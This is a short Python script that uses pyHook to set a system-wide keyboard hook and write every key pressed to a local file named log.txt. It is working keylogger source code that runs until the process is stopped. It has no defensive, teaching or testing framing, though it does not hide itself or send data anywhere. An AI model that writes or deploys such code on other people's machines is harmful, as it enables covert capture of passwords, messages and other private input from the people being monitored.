import pythoncom, pyHook

def OnKeyboardEvent(event):
    # open a file in append mode
    with open("log.txt", "a") as f:
        # write the key to the file
        f.write(event.Key)
        # add a new line after each key press
        f.write("\n")
    return True

def main():
    # create a hook manager
    hm = pyHook.HookManager()
    # watch for all keyboard events
    hm.KeyDown = OnKeyboardEvent
    # set the hook
    hm.HookKeyboard()
    # wait forever
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()